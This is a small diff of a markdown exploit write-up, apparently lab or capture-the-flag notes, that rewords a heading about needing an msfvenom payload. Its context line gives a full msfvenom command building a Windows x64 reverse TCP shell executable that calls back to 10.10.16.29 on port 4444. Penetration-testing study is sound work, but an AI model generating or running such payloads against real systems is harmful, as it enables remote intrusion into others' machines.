@@ -1,4 +1,4 @@
-## in order for some of our exploit to work we need a payload from msfvenom
+## In order for  our exploit to work well, we need a payload from msfvenom or you can use online payload generators
 ```
 command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe
 
